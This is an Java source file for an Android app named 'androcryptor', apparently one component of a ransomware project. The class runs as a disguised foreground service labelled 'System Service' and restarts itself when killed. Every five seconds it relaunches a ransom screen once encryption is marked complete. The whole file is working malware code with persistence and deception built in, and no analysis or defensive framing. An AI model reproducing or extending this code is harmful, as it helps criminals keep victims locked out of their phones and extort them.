package com.example.androcryptor;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo; // Added
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

/**
 * Service to ensure the ransomware stays active.
 * This service periodically checks if the RansomActivity is running
 * and restarts it if it's not.
 */
public class PersistenceService extends Service {

    private static final String TAG = "PersistenceService";
    private static final String NOTIFICATION_CHANNEL_ID = "PersistenceServiceChannel";
    private static final int NOTIFICATION_ID = 2;
    
    private Handler handler;
    private Runnable checkRunnable;
    private static final long CHECK_INTERVAL = 5000; // 5 seconds

    @Override
    public void onCreate() {
        super.onCreate();
        
        createNotificationChannel();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // Changed to Q for foregroundServiceType
            startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, createNotification());
        }
        
        handler = new Handler(Looper.getMainLooper());
        checkRunnable = new Runnable() {
            @Override
            public void run() {
                boolean encryptionComplete = isEncryptionComplete();
                
                if (encryptionComplete) {
                    Intent intent = new Intent(PersistenceService.this, RansomActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }
                
                handler.postDelayed(this, CHECK_INTERVAL);
            }
        };
        
        handler.post(checkRunnable);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        
        if (handler != null && checkRunnable != null) {
            handler.removeCallbacks(checkRunnable);
        }
        
        Intent restartServiceIntent = new Intent(getApplicationContext(), PersistenceService.class);
        startService(restartServiceIntent);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    NOTIFICATION_CHANNEL_ID,
                    "System Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Background system service");
            channel.setSound(null, null);
            channel.enableVibration(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Monitoring system performance...")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setSound(null)
                .setVibrate(null)
                .build();
    }
    
    private boolean isEncryptionComplete() {
        try {
            return getSharedPreferences("ac_prefs", MODE_PRIVATE)
                    .getBoolean("encryption_complete", false);
        } catch (Exception e) {
            return false;
        }
    }
}
